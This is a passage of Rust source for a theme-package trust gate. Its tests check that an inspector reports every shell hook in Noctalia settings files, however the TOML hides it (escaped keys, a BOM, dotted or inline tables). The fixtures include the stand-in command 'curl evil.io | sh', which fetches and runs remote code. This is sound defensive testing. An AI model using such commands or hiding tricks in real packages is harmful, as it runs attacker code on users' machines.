/// One-shot consent state shared by both apply paths.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct TrustGate {
    /// The attempt the warning is currently asking about.
    pending: Option<PendingApply>,
    /// The name the keeper confirmed, consumed by the next matching
    /// [`TrustGate::request`] and cleared by [`TrustGate::finish_confirm`].
    confirmed: Option<String>,
}

impl TrustGate {
    /// A closed gate (no pending attempt, no confirmation).
    pub const fn new() -> Self {
        Self {
            pending: None,
            confirmed: None,
        }
    }

    /// Whether the warning is (or must be) on screen.
    pub fn is_open(&self) -> bool {
        self.pending.is_some()
    }

    /// The attempt being held, for diagnostics.
    pub fn pending(&self) -> Option<&PendingApply> {
        self.pending.as_ref()
    }

    /// The name confirmed but not yet re-entered, for diagnostics.
    pub fn confirmed(&self) -> Option<&str> {
        self.confirmed.as_deref()
    }

    /// Consult the gate for ONE apply attempt.
    ///
    /// Order matters and is pinned by test: the modal check wins (nothing
    /// applies behind an open warning), then the one-shot confirmation,
    /// then the report — an empty report is the pre-W2 behaviour and is
    /// never held.
    pub fn request(
        &mut self,
        name: &str,
        index: i32,
        origin: ApplyOrigin,
        report: &ThemeTrustReport,
    ) -> GateDecision {
        if self.pending.is_some() {
            return GateDecision::Blocked;
        }
        if self.confirmed.as_deref() == Some(name) {
            self.confirmed = None;
            return GateDecision::Proceed;
        }
        if report.is_empty() {
            return GateDecision::Proceed;
        }
        self.pending = Some(PendingApply {
            name: name.to_string(),
            index,
            origin,
        });
        GateDecision::Hold
    }

    /// The keeper pressed Continue: take the pending attempt and arm the
    /// one-shot confirmation for its name. The caller re-invokes the SAME
    /// entry point, whose `request` then returns [`GateDecision::Proceed`].
    pub fn begin_confirm(&mut self) -> Option<PendingApply> {
        let pending = self.pending.take()?;
        self.confirmed = Some(pending.name.clone());
        Some(pending)
    }

    /// Close the one-shot confirmation after the re-invocation returns. A
    /// re-entry that never reached `request` (the mutating guard, a
    /// vanished window) must NOT leave stale consent behind: the next
    /// attempt on that theme warns again.
    pub fn finish_confirm(&mut self) {
        self.confirmed = None;
    }

    /// The keeper pressed Cancel (or Escape): forget the pending attempt
    /// and change nothing. Returns whether there was one.
    pub fn cancel(&mut self) -> bool {
        self.pending.take().is_some()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    /// The shipped shape: a theme's `noctalia-v5` `settings.toml`.
    fn write_settings(theme: &Path, text: &str) {
        let dir = theme.join("providers").join("noctalia-v5");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("settings.toml"), text).unwrap();
    }

    fn write_preset(theme: &Path, category: &str, name: &str) {
        let dir = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join(category);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(name), "-- preset body\n").unwrap();
    }

    /// Every file under `root`, relative and sorted — a read-only fingerprint.
    fn tree(root: &Path) -> Vec<String> {
        let mut out = Vec::new();
        let mut stack = vec![root.to_path_buf()];
        while let Some(dir) = stack.pop() {
            let Ok(entries) = fs::read_dir(&dir) else {
                continue;
            };
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    stack.push(path);
                } else {
                    out.push(path.strip_prefix(root).unwrap().display().to_string());
                }
            }
        }
        out.sort();
        out
    }

    /// W1: the report carries each hook key with its command text VERBATIM
    /// (the warning words itself from both), names the provider file it came
    /// from, and does NOT mistake data for commands: `[hooks]` also holds
    /// `community_ids = [ … ]`, which Noctalia never executes, and keys of
    /// other sections (`config_version`, `[wallpaper] path`) are not hooks.
    #[test]
    fn reports_each_hook_key_and_its_command_text_verbatim() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "config_version = \"1.2\"\n\
             \n\
             [hooks]\n\
             started = \"/home/other/.local/share/sddm/themes/SilentDinamic/sddm-sync.sh\"\n\
             colors_changed = \"notify-send palette changed\"\n\
             community_ids = [ \"abc\" ]\n\
             shutdown = \"sddm-watch.sh\" # the keeper's watchdog\n\
             \n\
             [wallpaper]\n\
             path = \"/home/other/wall.png\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "/home/other/.local/share/sddm/themes/SilentDinamic/sddm-sync.sh"
                        .into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "colors_changed".into(),
                    command: "notify-send palette changed".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "shutdown".into(),
                    command: "sddm-watch.sh".into(),
                },
            ],
            "each [hooks] key must come back with its command text verbatim, in file order; \
             an array value or another section's key is not a hook, got: {:?}",
            report.shell_hooks
        );
        assert!(
            !report.is_empty(),
            "a theme carrying hooks must not read as empty"
        );
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
    }

    /// A MULTI-LINE string (`"""` / `'''`) is one legal TOML value, and
    /// Noctalia's parser hands the whole string to the shell as ONE command.
    /// The line reader used to drop the opener (the hook vanished: the gate
    /// saw an EMPTY package) and to let inner lines surface as fake
    /// `key = value` hooks. The real command — every line of the string —
    /// must be reported under the key it belongs to, in file order.
    #[test]
    fn a_multi_line_hook_string_reports_its_real_command() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "[hooks]\n\
             started = \"\"\"\n\
             export FOO=bar\n\
             echo \"$FOO\"\n\
             \"\"\"\n\
             colors_changed = \"notify-send hi\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "export FOO=bar\necho \"$FOO\"".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "colors_changed".into(),
                    command: "notify-send hi".into(),
                },
            ],
            "the multi-line string is ONE hook command (no key invented from its \
             inner lines), got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a multi-line hook must not read as empty");

        // The literal (`'''`) spelling is the same value to a TOML parser.
        let literal = tmp.path().join("Literal");
        write_settings(
            &literal,
            "[hooks]\nshutdown = '''\npkill -x sddm-watch\n'''\n[idle]\nenabled = true\n",
        );
        let report = inspect_theme_package(&literal);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "shutdown".into(),
                command: "pkill -x sddm-watch".into(),
            }],
            "a ''' multi-line literal must report its command too, got: {:?}",
            report.shell_hooks
        );
    }

    /// A QUOTED table header (`["hooks"]`, `['hooks']`) is the SAME table as
    /// `[hooks]` — plain TOML Noctalia's own parser honours. The header
    /// reader used to keep the quotes in the name, so the whole section was
    /// skipped and every hook in it stayed invisible to the gate.
    #[test]
    fn a_quoted_hooks_table_header_names_the_same_table() {
        let tmp = tempfile::tempdir().unwrap();

        let double = tmp.path().join("Double");
        write_settings(&double, "[\"hooks\"]\nstarted = \"boot.sh\"\n");
        let report = inspect_theme_package(&double);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "boot.sh".into(),
            }],
            "a [\"hooks\"] header must be honoured, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a quoted header must not read as empty");

        let single = tmp.path().join("Single");
        write_settings(&single, "['hooks']\nshutdown = \"bye.sh\"\n");
        let report = inspect_theme_package(&single);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "shutdown".into(),
                command: "bye.sh".into(),
            }],
            "a ['hooks'] header must be honoured, got: {:?}",
            report.shell_hooks
        );
    }

    /// CRITICAL-class: at the document ROOT, `hooks.started = "…"` is plain
    /// TOML for the SAME table `[hooks]` declares — Noctalia deserializes it
    /// and runs the command on apply. The reader used to start collecting
    /// only after the first section header, so every line before it was
    /// skipped and the gate saw an EMPTY report for a file that carries a
    /// command. The dotted key is reported with the PLAIN key (`started`,
    /// not `hooks.started`) and the command verbatim, in every legal
    /// spelling of the key itself.
    #[test]
    fn a_root_level_dotted_hooks_key_is_reported_with_the_plain_key() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(
            &dotted,
            "config_version = \"1.2\"\n\
             \n\
             hooks.started = \"curl evil.io | sh\"\n\
             \n\
             [wallpaper]\n\
             path = \"/home/other/wall.png\"\n",
        );
        let report = inspect_theme_package(&dotted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a root-level hooks.started key must report the plain key with the \
             verbatim command, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level hook must not read as empty");
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");

        // A QUOTED sub-key (`hooks."colors_changed"`) is the same key to a
        // TOML parser; the report strips the quotes like every other key.
        let quoted = tmp.path().join("Quoted");
        write_settings(&quoted, "hooks.\"colors_changed\" = \"notify-send palette changed\"\n");
        let report = inspect_theme_package(&quoted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "colors_changed".into(),
                command: "notify-send palette changed".into(),
            }],
            "hooks.\"colors_changed\" must report the plain key, got: {:?}",
            report.shell_hooks
        );

        // Whitespace around the dots (`hooks . started`) is legal TOML for
        // the same key.
        let spaced = tmp.path().join("Spaced");
        write_settings(&spaced, "hooks . started = \"sddm-watch.sh\"\n");
        let report = inspect_theme_package(&spaced);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "sddm-watch.sh".into(),
            }],
            "hooks . started must report the plain key, got: {:?}",
            report.shell_hooks
        );

        // Both parts quoted (`"hooks"."started"`) is the same dotted key.
        let quoted_both = tmp.path().join("QuotedBoth");
        write_settings(&quoted_both, "\"hooks\".\"started\" = \"boot.sh\"\n");
        let report = inspect_theme_package(&quoted_both);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "boot.sh".into(),
            }],
            "\"hooks\".\"started\" must report the plain key, got: {:?}",
            report.shell_hooks
        );
    }

    /// The dotted spelling carries a MULTI-LINE string too: Noctalia's
    /// parser hands the whole string to the shell as ONE command, so the
    /// opener line must not vanish (the gate would see an empty report
    /// while the command runs on apply).
    #[test]
    fn a_root_level_dotted_hook_with_a_multi_line_string_reports_its_real_command() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "hooks.started = \"\"\"\n\
             export FOO=bar\n\
             echo \"$FOO\"\n\
             \"\"\"\n\
             [idle]\n\
             enabled = true\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "export FOO=bar\necho \"$FOO\"".into(),
            }],
            "the root-level multi-line string is ONE hook command under the plain \
             key, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level multi-line hook must not read as empty");
    }

    /// CRITICAL-class, the inline-table spelling: `hooks = { … }` written at
    /// the root IS the `[hooks]` table. Every entry is reported like a pair
    /// under the header — quoted keys, extra whitespace and a trailing comma
    /// are all legal TOML for it.
    #[test]
    fn a_root_level_inline_hooks_table_reports_every_entry() {
        let tmp = tempfile::tempdir().unwrap();

        let one = tmp.path().join("One");
        write_settings(&one, "hooks = { started = \"curl evil.io | sh\" }\n");
        let report = inspect_theme_package(&one);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a root-level hooks = {{ … }} table must report its entry, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level inline hook must not read as empty");

        let many = tmp.path().join("Many");
        write_settings(
            &many,
            "hooks = {  \"started\" = \"curl evil.io | sh\" ,  \
             colors_changed = \"notify-send hi\" , }\n",
        );
        let report = inspect_theme_package(&many);
        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "curl evil.io | sh".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "colors_changed".into(),
                    command: "notify-send hi".into(),
                },
            ],
            "every entry of the root-level inline table must be reported in order \
             (quoted keys, extra whitespace, trailing comma), got: {:?}",
            report.shell_hooks
        );
    }

    /// A MULTI-LINE string is a legal value inside an inline table (the
    /// newline is within the value), and it is still ONE command Noctalia
    /// runs — the opener line must not hide it from the gate.
    #[test]
    fn a_root_level_inline_hooks_table_with_a_multi_line_string_reports_its_command() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "hooks = { started = \"\"\"\n\
             pkill -x sddm-watch\n\
             \"\"\" }\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "pkill -x sddm-watch".into(),
            }],
            "a multi-line string inside the root-level inline table is ONE hook \
             command, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level inline multi-line hook must not read as empty");
    }

    /// The "an empty value is not a hook" rule holds for both root-level
    /// spellings: nothing to run, nothing to warn about.
    #[test]
    fn an_empty_command_in_a_root_level_hooks_spelling_is_not_reported() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "hooks.started = \"\"\n");
        let report = inspect_theme_package(&dotted);
        assert!(
            report.is_empty(),
            "an empty root-level dotted command is not a hook, got: {:?}",
            report
        );

        let inline = tmp.path().join("Inline");
        write_settings(&inline, "hooks = { started = \"\" }\n");
        let report = inspect_theme_package(&inline);
        assert!(
            report.is_empty(),
            "an empty root-level inline-table command is not a hook, got: {:?}",
            report
        );
    }

    /// The root-level spellings count ONLY at the document ROOT. Under a
    /// section the same text is `<section>.hooks.started`, which Noctalia
    /// never executes — reporting it would nag the keeper over nothing.
    #[test]
    fn root_level_hooks_spellings_under_a_section_are_not_reported() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "[noctalia]\nhooks.started = \"x\"\n");
        let report = inspect_theme_package(&dotted);
        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty(), "noctalia.hooks.started is not a hook");

        let inline = tmp.path().join("Inline");
        write_settings(&inline, "[other]\nhooks = { started = \"x\" }\n");
        let report = inspect_theme_package(&inline);
        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty(), "other.hooks is not the hooks table");
    }

    /// A QUOTED key with a dot inside it is ONE literal key name in TOML
    /// (`"127.0.0.1" = …` is a valid key in the spec): `"hooks.started"` is
    /// NOT the hooks table, and Noctalia never executes it — reporting it
    /// would be a false positive that nags the keeper over nothing.
    #[test]
    fn a_fully_quoted_dotted_key_is_not_the_hooks_table() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "\"hooks.started\" = \"curl evil.io | sh\"\n");

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(
            report.is_empty(),
            "\"hooks.started\" is one literal key, not the hooks table, got: {:?}",
            report
        );
    }

    /// The `{` false positive: a VALUE that opens an inline table (a nested
    /// config, never a command) must report NOTHING. The reader used to fall
    /// into the unquoted-value branch and report the bogus command `"{"`,
    /// nagging the keeper on a theme that carries no command at all.
    #[test]
    fn an_inline_table_value_inside_the_hooks_section_reports_nothing() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "[hooks]\n\
             started = { cmd = \"echo hi\" }\n\
             [wallpaper]\n\
             path = \"/home/other/wall.png\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty(), "an inline-table value is not a hook");
    }

    /// W1c-b, CRITICAL-class: a TOML BASIC string key carries ESCAPES, and
    /// a real parser decodes them BEFORE matching the table name — verified
    /// with `toml` 1.1.2 (`+spec-1.1.0`, this repo's lockfile): all three
    /// spellings below deserialize as `hooks.started = "…"`, so the command
    /// runs on apply while the reader compared the RAW text and reported
    /// NOTHING (the gate stayed silent — CRITICAL-1 again). A LITERAL
    /// string key has no escapes and is pinned as NOT hooks in
    /// [`spellings_that_are_not_the_hooks_table_stay_unreported`].
    #[test]
    fn a_basic_string_escape_in_a_key_names_the_hooks_table() {
        let tmp = tempfile::tempdir().unwrap();

        // The root dotted spelling with an escaped TABLE name.
        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "\"\\u0068ooks\".started = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&dotted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "\"\\u0068ooks\".started IS the hooks table to a real parser, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "an escaped table name must not read as empty");

        // The header spelling with an escaped TABLE name.
        let header = tmp.path().join("Header");
        write_settings(&header, "[\"\\u0068ooks\"]\nstarted = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&header);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "[\"\\u0068ooks\"] IS the hooks table to a real parser, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "an escaped header must not read as empty");

        // The escaped SUB-key of a dotted spelling.
        let sub = tmp.path().join("Sub");
        write_settings(&sub, "\"hook\\u0073\".started = \"x\"\n");
        let report = inspect_theme_package(&sub);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "x".into(),
            }],
            "\"hook\\u0073\".started IS the hooks table to a real parser, got: {:?}",
            report.shell_hooks
        );
        assert!(report.lua_presets.is_empty(), "these fixtures carry no presets");
    }

    /// W1c-b, CRITICAL-class: a UTF-8 BOM (U+FEFF) is accepted at the
    /// start of a TOML file and is NOT `char::is_whitespace`, so `trim()`
    /// never removed it — `<BOM>hooks.started = "…"` slipped past the root
    /// reader and a BOM before the first header slipped past the section
    /// reader (both PARSED as hooks by `toml` 1.1.2), while the command
    /// runs on apply and the gate saw an EMPTY report.
    #[test]
    fn a_leading_utf8_bom_does_not_hide_the_hooks_table() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "\u{feff}hooks.started = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&dotted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a BOM before a root-level hooks key must not hide it, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a BOM'd root-level hook must not read as empty");

        let header = tmp.path().join("Header");
        write_settings(&header, "\u{feff}[hooks]\nstarted = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&header);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a BOM before the first header must not hide the section, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a BOM'd header hook must not read as empty");
    }

    /// W1c-b, FAIL CLOSED: a multi-line inline table is VALID TOML under
    /// spec 1.1 — `toml` 1.1.2 parses `hooks = {\n  started = "…"\n}` —
    /// and the W1c comment claiming such a file is rejected was FALSE.
    /// This line-based reader cannot follow the table across lines, so it
    /// must report ONE clearly-named conservative entry (naming the file
    /// and the opener line, stating the report may be incomplete) instead
    /// of an EMPTY report: the keeper cannot consent to what nobody
    /// inspected. An unclosed opener whose only command is EMPTY must not
    /// fall back to an empty report either.
    #[test]
    fn a_multi_line_inline_hooks_table_reports_a_conservative_entry_not_an_empty_report() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "hooks = {\nstarted = \"curl evil.io | sh\"\n}\n");
        let settings = theme.join("providers").join("noctalia-v5").join("settings.toml");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "hooks table".into(),
                command: format!(
                    "the hooks table in {} (line 1) could not be fully read by this scan; \
                     it may carry shell commands that are not listed here",
                    settings.display()
                ),
            }],
            "an unreadable hooks table must produce exactly one conservative entry, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "an unreadable hooks table must never read as empty");
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");

        // The gate holds on it: the keeper sees the line
        // `{key} — {command}` built from this very entry.
        let mut gate = TrustGate::new();
        assert_eq!(
            gate.request("Theme", 0, ApplyOrigin::Gallery, &report),
            GateDecision::Hold,
            "the conservative entry must hold the apply behind the warning"
        );

        // An unclosed opener whose only command is EMPTY: the empty
        // command is not a hook, but the table still cannot be read, so
        // the report must not fall back to empty either.
        let unclosed = tmp.path().join("Unclosed");
        write_settings(&unclosed, "hooks = { started = \"\"\n");
        let report = inspect_theme_package(&unclosed);
        assert_eq!(report.shell_hooks.len(), 1, "got: {:?}", report.shell_hooks);
        assert_eq!(
            report.shell_hooks[0].key, "hooks table",
            "the conservative entry must be clearly named, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "an unclosed hooks table must never read as empty");
    }

    /// W1c-b, FAIL CLOSED (the deferred half): when the multi-line string
    /// an inline table OPENS finally ends, the rest of that line can carry
    /// more entries (`""", shutdown = "evil" }`). This reader never reads
    /// them, so the conservative entry must still be reported — next to
    /// the entries it DID read, so the gate holds and the keeper learns
    /// the list in front of him is incomplete.
    #[test]
    fn entries_after_a_multi_line_string_in_an_inline_table_still_fail_closed() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "hooks = { started = \"\"\"\npkill -x sddm-watch\n\"\"\", shutdown = \"evil\" }\n",
        );
        let settings = theme.join("providers").join("noctalia-v5").join("settings.toml");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "pkill -x sddm-watch".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "hooks table".into(),
                    command: format!(
                        "the hooks table in {} (line 1) could not be fully read by this scan; \
                         it may carry shell commands that are not listed here",
                        settings.display()
                    ),
                },
            ],
            "the entries after the multi-line string were never read: report the \
             conservative entry beside what was read, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty());
    }

    /// The correctly-NOT-reported spellings (a parser would not run them,
    /// so warning on them would nag the keeper over nothing) stay silent —
    /// they pin that decoding basic-string keys did NOT widen the gate: a
    /// LITERAL string key has no escapes in TOML (`'\u0068ooks'` is that
    /// literal key, verified against `toml` 1.1.2), `hooksx.started` and
    /// one quoted key with a dot inside are not the table, `[[hooks]]` is
    /// an array of tables Noctalia never deserializes as its hooks map,
    /// and `hooks = {}` is a readable, EMPTY table. Characterization: this
    /// must be green before AND after the fix.
    #[test]
    fn spellings_that_are_not_the_hooks_table_stay_unreported() {
        let tmp = tempfile::tempdir().unwrap();

        let literal = tmp.path().join("Literal");
        write_settings(&literal, "['\\u0068ooks']\nstarted = \"x\"\n");
        assert!(
            inspect_theme_package(&literal).is_empty(),
            "a literal string key has no escapes: '\\u0068ooks' is NOT the hooks table"
        );

        let near_miss = tmp.path().join("NearMiss");
        write_settings(&near_miss, "hooksx.started = \"x\"\n");
        assert!(
            inspect_theme_package(&near_miss).is_empty(),
            "hooksx.started is not the hooks table"
        );

        let array = tmp.path().join("Array");
        write_settings(&array, "[[hooks]]\nstarted = \"x\"\n");
        assert!(
            inspect_theme_package(&array).is_empty(),
            "[[hooks]] is an array of tables, not the hooks map"
        );

        let empty = tmp.path().join("Empty");
        write_settings(&empty, "hooks = {}\n");
        assert!(
            inspect_theme_package(&empty).is_empty(),
            "hooks = {{}} is a readable empty table"
        );
    }

    /// The key decoder itself: a BASIC string (`"…"`) decodes `\uXXXX`,
    /// `\UXXXXXXXX` and the simple escapes; a LITERAL string (`'…'`) and
    /// a bare key come back verbatim (TOML literal strings have no
    /// escapes); an escape the parser would REJECT (wrong hex, a
    /// surrogate scalar) stays verbatim instead of decoding into a table
    /// name this gate would then report.
    #[test]
    fn a_basic_string_key_decoder_decodes_escapes_and_keeps_literal_strings_verbatim() {
        assert_eq!(decode_key("\"\\u0068ooks\""), "hooks");
        assert_eq!(decode_key("\"\\U00000068ooks\""), "hooks");
        assert_eq!(decode_key("\"a\\b\\t\\n\\f\\r\""), "a\u{8}\t\n\u{c}\r");
        assert_eq!(decode_key("\"q\\\"b\""), "q\"b");
        assert_eq!(decode_key("\"back\\\\slash\""), "back\\slash");
        assert_eq!(decode_key("'hooks'"), "hooks");
        assert_eq!(decode_key("'\\u0068ooks'"), "\\u0068ooks");
        assert_eq!(decode_key("hooks"), "hooks");
        assert_eq!(decode_key("\"\\ud800\""), "\\ud800");
    }

    /// Acceptance criterion 2: an empty `[hooks]` section and no presets
    /// still reads EMPTY — the gate never fires for a theme with nothing to
    /// report.
    #[test]
    fn an_empty_hooks_section_with_no_presets_still_reports_an_empty_report() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\n");

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
        assert!(report.is_empty());
    }

    /// Every `providers/<provider>/settings.toml` is walked, not only the
    /// shipped `noctalia-v5`, and each hook names the provider it came from.
    #[test]
    fn walks_every_provider_settings_file() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\nstarted = \"boot.sh\"\n");
        let other = theme.join("providers").join("some-other-tool");
        fs::create_dir_all(&other).unwrap();
        fs::write(other.join("settings.toml"), "[hooks]\nshutdown = \"bye.sh\"\n").unwrap();

        let report = inspect_theme_package(&theme);

        let pairs: Vec<(String, String)> = report
            .shell_hooks
            .iter()
            .map(|h| (h.provider.clone(), h.key.clone()))
            .collect();
        assert_eq!(
            pairs,
            vec![
                ("noctalia-v5".to_string(), "started".to_string()),
                ("some-other-tool".to_string(), "shutdown".to_string()),
            ],
            "provider dirs are walked in sorted order, got: {:?}",
            report.shell_hooks
        );
    }

    /// A `settings.toml` with no `[hooks]` at all carries no hook.
    #[test]
    fn a_settings_toml_without_a_hooks_section_reports_no_hooks() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "[wallpaper]\npath = \"/home/other/wall.png\"\n\n[shell]\nenabled = true\n",
        );

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(
            report.is_empty(),
            "a theme with neither hooks nor Lua presets must read as empty"
        );
    }

    /// The SHIPPED shape: package-time sanitizing drops the machine-only hook
    /// lines and leaves the header with an EMPTY body — no hook, no warning.
    #[test]
    fn an_empty_hooks_section_reports_no_hooks() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\n\n[idle]\nenabled = true\n");

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty());
    }

    /// W1: the report names the preset files the package carries (names AND
    /// theme-relative paths for the warning), only from the category
    /// directories `install_theme_presets` reads on apply, and only the
    /// extensions it installs (`*.lua`, `*.frag` — `PRESET_EXTENSIONS`): a
    /// stray text file and a preset outside the installable categories
    /// never reach the user store, so they are not presets this gate must
    /// name. A `.frag` in `borders/` DOES reach `overlay.lua` — the apply
    /// resolves it by name and `cat`s it — so it IS named (next test).
    #[test]
    fn reports_the_lua_presets_the_package_carries() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_preset(&theme, "animations", "travel.lua");
        write_preset(&theme, "borders", "Space.lua");
        write_preset(&theme, "animations", "notes.txt");
        write_preset(&theme, "borders", "scan.frag");
        write_preset(&theme, "stray-category", "evil.lua");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.lua_presets,
            vec![
                LuaPreset {
                    category: "animations".into(),
                    file_name: "travel.lua".into(),
                },
                LuaPreset {
                    category: "borders".into(),
                    file_name: "Space.lua".into(),
                },
                LuaPreset {
                    category: "borders".into(),
                    file_name: "scan.frag".into(),
                },
            ],
            "every preset the apply installs and can execute must be named in \
             CATEGORIES order, got: {:?}",
            report.lua_presets
        );
        assert_eq!(
            report.lua_presets[0].theme_relative_path(),
            Path::new("presets/animations/travel.lua"),
            "the warning must be able to show where the preset lives"
        );
        assert!(report.shell_hooks.is_empty());
        assert!(!report.is_empty(), "a theme carrying presets must not read as empty");
    }

    /// The report must name what the apply ACTUALLY installs and executes,
    /// which is wider than `*.lua`: `install_theme_presets` installs every
    /// `PRESET_EXTENSIONS` file (`lua`, `frag`) into the user store, and for
    /// `animations/` and `borders/` the shell resolves the preset BY NAME,
    /// content-blind (`hve_resolve_preset`), then `cat`s whatever file it
